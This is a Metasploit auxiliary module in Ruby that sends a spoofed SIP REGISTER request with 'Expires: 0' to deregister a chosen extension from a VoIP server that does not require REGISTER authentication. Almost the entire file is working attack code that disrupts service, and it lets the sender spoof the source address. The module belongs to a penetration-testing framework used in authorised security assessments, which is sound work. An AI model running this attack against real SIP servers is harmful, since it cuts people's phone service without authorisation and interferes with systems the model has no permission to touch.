##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SIP Deregister Extension',
      'Description' => %q{
          This module will attempt to deregister a SIP user from the provider. It
        has been tested successfully when the sip provider/server doesn't use REGISTER
        authentication.
      },
      'Author' => [ 'ChrisJohnRiley' ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [SERVICE_RESOURCE_LOSS],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    )

    deregister_udp_options
    register_options(
      [
        Opt::RPORT(5060),
        OptString.new('SRCADDR', [true, 'The sip address the spoofed deregister request is coming from', '192.168.1.1']),
        OptString.new('EXTENSION', [true, 'The specific extension or name to target', '100']),
        OptString.new('DOMAIN', [true, 'Use a specific SIP domain', 'example.com'])
      ]
    )
    register_advanced_options(
      [
        OptAddress.new('SIP_PROXY_NAME', [false, 'Use a specific SIP proxy', nil]),
        OptPort.new('SIP_PROXY_PORT', [false, 'SIP Proxy port to use', 5060])
      ]
    )
  end

  def setup
    # throw argument error if extension or domain contain spaces
    if datastore['EXTENSION'].match(/\s/)
      raise ArgumentError, 'EXTENSION cannot contain spaces'
    elsif datastore['DOMAIN'].match(/\s/)
      raise ArgumentError, 'DOMAIN cannot contain spaces'
    end
  end

  def run_host(ip)
    src = datastore['SRCADDR']
    ext = datastore['EXTENSION']
    dom = datastore['DOMAIN']
    sphost = datastore['SIP_PROXY_NAME']
    spport = datastore['SIP_PROXY_PORT'] || 5060
    conn_string = "#{ext}@#{dom}"

    # set Route header if SIP_PROXY is set
    if !sphost.nil? && !sphost.empty?
      route = "Route: <sip:#{sphost}:#{spport};lr>\r\n"
    end

    connect_udp

    print_status("Sending deregistration packet to: #{conn_string}")
    print_status("Using SIP proxy #{sphost}:#{spport}") if route

    req = "REGISTER sip:#{dom} SIP/2.0" + "\r\n"
    req << route if route
    req << "Via: SIP/2.0/UDP #{src}" + "\r\n"
    req << 'Max-Forwards: 70' + "\r\n"
    req << "To: \"#{ext}\"<sip:#{conn_string}>" + "\r\n"
    req << "From: \"#{ext}\"<sip:#{conn_string}>" + "\r\n"
    req << "Call-ID: #{rand(100..199)}#{ip}" + "\r\n"
    req << 'CSeq: 1 REGISTER' + "\r\n"
    req << 'Contact: *' + "\r\n"
    req << 'Expires: 0' + "\r\n"
    req << 'Content-Length: 0' + "\r\n\r\n"

    udp_sock.put(req)
    response = false

    while ((r = udp_sock.recvfrom(65535, 3))) && r[1]
      response = parse_reply(r)
    end

    # print error information if no response has been received
    # may be expected if spoofing the SRCADDR
    print_error('No response received from remote host') if !response
  rescue Errno::EACCES => e
    vprint_error(e.message)
  ensure
    disconnect_udp
  end

  def parse_reply(pkt)
    # parse response to check if the ext was successfully de-registered

    if (pkt[1] =~ /^::ffff:/)
      pkt[1] = pkt[1].sub(/^::ffff:/, '')
    end

    resp = pkt[0].split(/\s+/)[1]
    _rhost = pkt[1]
    _rport = pkt[2]

    if (pkt[0] =~ /^To:\s*(.*)$/i)
      testn = ::Regexp.last_match(1).strip.to_s.split(';')[0]
    end

    case resp.to_i
    when 401
      print_error("Unable to de-register #{testn} [401 Unauthorised]")
    when 403
      print_error("Unable to de-register #{testn} [403 Forbidden]")
    when 200
      print_good("#{testn} de-registered [200 OK]")
    else
      print_error("#{testn} : Undefined error code #{resp.to_i}")
    end

    return true # set response to true
  end
end
